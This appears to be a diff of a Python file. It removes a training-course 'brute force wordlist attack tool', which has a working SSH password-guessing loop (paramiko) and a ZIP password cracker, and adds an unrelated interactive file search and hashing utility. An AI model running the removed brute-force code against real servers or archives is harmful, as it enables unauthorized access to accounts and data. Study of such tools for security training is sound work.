@@ -1,104 +1,111 @@
-#!/usr/bin/env python3
-# Script Name:                  Ops 18 Automated Brute Force Wordlist Attack Tool Part 3 of 3
-# Author:                       Rodolfo Gonzalez
-# Date of latest revision:      01/31/2024      
+import os
+import hashlib
+import inspect
 
-# Purpose:                      Provides four modes for interacting with a word list file, allowing users to
-# Purpose cont:                 either iterate through the list with delays (simulating a dictionary attack), 
-# Purpose cont:                 search for specific words within the list, authenticate to an SSH server by its IP address,
-# Purpose cont:                 or perform a brute force attack on a password-locked zip file.
-# Resource:                     https://chat.openai.com/share/6fa45c27-3231-47cf-a6fa-3d855cf80f79
-# Team member:                  JC
+def hash_file(filename, algorithm='sha1'):
+    """This function returns the hash of the file passed into it"""
+    if algorithm.lower() == 'sha1':
+        hash_func = hashlib.sha1()
+    elif algorithm.lower() == 'md5':
+        hash_func = hashlib.md5()
+    elif algorithm.lower() == 'sha256':
+        hash_func = hashlib.sha256()
+    else:
+        raise ValueError("Unsupported hash algorithm")
 
-import time
-import paramiko
-import zipfile
+    with open(filename, 'rb') as file:
+        chunk = 0
+        while chunk != b'':
+            chunk = file.read(1024)
+            hash_func.update(chunk)
+    return hash_func.hexdigest()
 
-# Function to perform Mode 1: Offensive; Dictionary Iterator
-def offensive_mode(file_path):
-    delay = float(input("Enter the delay between words (in seconds): "))
-    max_lines = int(input("Enter the maximum number of lines to display: "))
-    line_count = 0
-    try:
-        with open(file_path, 'r') as file:
-            for _ in range(max_lines):
-                word = file.readline().strip()
-                if not word:
-                    break
-                print(word)
-                line_count += 1
-                time.sleep(delay)
-    except FileNotFoundError:
-        print("File not found.")
+def search_file(file_name, directory, hash_algorithm='sha1'):
+    hits = 0
+    files_searched = 0
 
-# Function to perform Mode 2: Defensive; Password Recognized
-def defensive_mode(file_path):
-    user_input = input("Enter a word to search: ")
-    try:
-        with open(file_path, 'r', errors='ignore') as file:
-            words = file.read().splitlines()
-            if user_input in words:
-                print("The word is in the word list.")
-            else:
-                print("The word is not in the word list.")
-    except FileNotFoundError:
-        print("File not found.")
+    if not os.path.isdir(directory):
+        print("Error: Invalid directory path.")
+        return 0, 0
 
-# Function to perform SSH brute force using the wordlist
-def ssh_brute_force(file_path, ip_address, username):
-    try:
-        with open(file_path, 'r') as file:
-            for word in file:
-                password = word.strip()
-                print(f"Trying password: {password}")
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                try:
-                    ssh.connect(ip_address, username=username, password=password)
-                    print(f"\033[32mWe found the password: {password}\033[0m")  # Corrected line
-                    return
-                except paramiko.AuthenticationException:
-                    print("\033[91mAuthentication failed. Trying next password.\033[0m")
-                finally:
-                    ssh.close()
-                time.sleep(1)
-    except FileNotFoundError:
-        print("File not found.")
+    print(f"Searching for '{file_name}' in '{directory}'...")
 
-# Function to perform ZIP Brute Force Attack
-def zip_brute_force(file_path, zip_file_path):
-    try:
-        with zipfile.ZipFile(zip_file_path, 'r') as zf:
-            with open(file_path, 'r') as file:
-                for word in file:
-                    password = word.strip()
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if file == file_name:
+                hits += 1
+                file_path = os.path.join(root, file)
+                print("\033[93mFound:", file_path, "\033[0m")
+                if input("Calculate hash of this file? (y/n): ").strip().lower() == 'y':
                     try:
-                        zf.extractall(pwd=bytes(password, 'utf-8'))
-                        print(f"Password found: {password}")
-                        return password
-                    except RuntimeError as e:
-                        if 'Bad password' in str(e):
-                            continue  # Incorrect password, move to the next
-                        else:
-                            print(f"Runtime error: {e}")
-                            break
-    except FileNotFoundError:
-        print(f"File not found. Please check the path and try again: {zip_file_path}")
-    except zipfile.BadZipFile:
-        print(f"Bad zip file or format not supported by zipfile module: {zip_file_path}")
+                        print(f"{hash_algorithm.upper()}: {hash_file(file_path, algorithm=hash_algorithm)}")
+                    except Exception as e:
+                        print(f"Error calculating hash for {file_path}: {e}")
+            files_searched += 1
+            print_progress(files_searched)
+
+    return hits, files_searched
+
+def print_progress(files_searched):
+    print(f"Files searched: {files_searched}", end='\r')
+
+def list_directories():
+    current_directory = os.getcwd()
+    print("Available directories:")
+    for item in os.listdir("/"):
+        item_path = os.path.join("/", item)
+        if os.path.isdir(item_path):
+            if item_path == current_directory:
+                print("\033[95m- ", item_path, "(Current Directory)\033[0m")
+            else:
+                print("\033[95m- ", item_path, "\033[0m")
+    print()
+
+def main():
+    while True:
+        print("\033[32m\nMenu:\033[0m")
+        print("1. Search for files")
+        print("2. List available directories")
+        print("3. Exit")
+
+        choice = input("\033[32mEnter your choice: \033[0m").strip()
+
+        if choice == "1":
+            file_name = input("Enter the file name to search for: ").strip()
+            directory = input("Enter the directory to search in or type 'list' to see available directories: ").strip()
+            hash_algorithm = input("Enter the hash algorithm (sha1/md5/sha256): ").strip()
+
+            if directory.lower() == "list":
+                list_directories()
+                continue
+
+            if not file_name:
+                print("Error: Please provide a file name.")
+                continue
+
+            if not directory:
+                print("Error: Please provide a directory.")
+                continue
+
+            if not os.path.exists(directory):
+                print("Error: Directory does not exist.")
+                continue
+
+            if hash_algorithm.lower() not in ['sha1', 'md5', 'sha256']:
+                print("Error: Unsupported hash algorithm.")
+                continue
+
+            search_file(file_name, directory, hash_algorithm)
+
+        elif choice == "2":
+            list_directories()
+
+        elif choice == "3":
+            print("Exiting...")
+            break
+
+        else:
+            print("Invalid choice. Please enter a number from 1 to 3.")
 
 if __name__ == "__main__":
-    mode = input("Select a mode\n (\033[95m 1 for Offensive\033[0m], \033[92m2 for Defensive\033[0m], \033[94m3 for SSH Brute Force\033[0m], \033[96m4 for ZIP Brute Force): \033[0m")
-    file_path = input("Enter the path of the word list file: ")  # Ask for the word list file path
-
-    if mode == '1':
-        offensive_mode(file_path)
-    elif mode == '2':
-        defensive_mode(file_path)
-    elif mode == '3':
-        ip_address = input("Enter the IP address of the SSH server: ")
-        username = input("Enter the SSH username: ")
-        ssh_brute_force(file_path, ip_address, username)
-    elif mode == '4':
-        zip_file_path = input("Enter the path of the ZIP file: ")
-        result = zip_brute
+    main()
